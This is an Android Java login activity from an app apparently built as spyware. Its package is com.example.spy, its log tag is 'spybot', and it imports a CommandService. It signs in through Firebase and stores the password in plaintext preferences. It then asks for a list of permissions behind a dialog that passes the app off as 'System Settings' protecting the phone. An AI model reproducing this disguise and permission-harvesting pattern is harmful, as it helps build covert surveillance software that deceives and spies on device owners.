package com.example.spy.activities;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.spy.R;
import com.example.spy.services.CommandService;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.textfield.TextInputEditText;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

public class LoginActivity extends Activity {

    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    String permissionRationale = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";

    String email, password;
    private FirebaseAuth mAuth;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        mAuth = FirebaseAuth.getInstance();

        final TextInputEditText txtEmail = findViewById(R.id.editEmail);
        final TextInputEditText editPassword = findViewById(R.id.editPassword);

        final MaterialButton actSignIn = findViewById(R.id.actSignIn);

        actSignIn.setOnClickListener(v -> {
            email = txtEmail.getText().toString();
            password = editPassword.getText().toString();

            if(TextUtils.isEmpty(email) || TextUtils.isEmpty(password)){
                Toast.makeText(v.getContext(),"Email atau Sandi belum diisi!",Toast.LENGTH_LONG).show();
            }else{

                getSignIn();
            }
        });

        start();
    }


    private void getSignIn(){
        mAuth.signInWithEmailAndPassword(email, password)
                .addOnCompleteListener(this, task -> {
                    if (task.isSuccessful()) {

                        SharedPreferences.Editor editor = prefs.edit();
                        editor.putString("email",email);
                        editor.putString("password",password);
                        editor.apply();


                        // Sign in success, update UI with the signed-in user's information
                        Log.d(tag, "signInWithEmail:success");
                        FirebaseUser user = mAuth.getCurrentUser();
                        updateUI(user);


                    } else {
                        // If sign in fails, display a message to the user.
                        Log.w(tag, "signInWithEmail:failure", task.getException());
                        Toast.makeText(LoginActivity.this, "Gagal masuk, periksa kembali akun.",
                                Toast.LENGTH_LONG).show();

                        updateUI(null);
                    }


                });

    }

    public void onStart() {
        super.onStart();
        // Check if user is signed in (non-null) and update UI accordingly.
        FirebaseUser currentUser = mAuth.getCurrentUser();
        updateUI(currentUser);
    }

    private void updateUI(FirebaseUser user) {
        // FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user != null) {

            // Name, email address, and profile photo Url
            String name = user.getDisplayName();
            String email = user.getEmail();
            Uri photoUrl = user.getPhotoUrl();

            // Check if user's email is verified
            boolean emailVerified = user.isEmailVerified();

            // The user's ID, unique to the Firebase project. Do NOT use this value to
            // authenticate with your backend server, if you have one. Use
            // FirebaseUser.getIdToken() instead.
            String uid = user.getUid();

            if (!TextUtils.isEmpty(uid)) {

                Intent intent = null;
                intent = new Intent(LoginActivity.this, MainActivity.class);
                startActivity(intent);
                finish();

            }
        }
    }


    private void start() {
        if (!hasPermissions()) {
            requestPermissions();
        }
    }

    private Boolean hasPermissions() {
        for (String permission : Constants.PERMISSIONS){
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int k = 0;

            for (String permission : Constants.PERMISSIONS){
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) k++;
            }

            if (k > 0) showPermissionRationale();

            else ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999);
        }
    }


    private void showPermissionRationale() {
        new AlertDialog.Builder(this).setIcon(R.mipmap.ic_launcher).setTitle("Permission Required")
                .setMessage(permissionRationale)
                .setPositiveButton("OK", (dialog, which) -> {
                    dialog.dismiss();
                    ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999);

                })
                .setNegativeButton("Batal", (dialog, which) -> dialog.dismiss())
                .show();

    }
}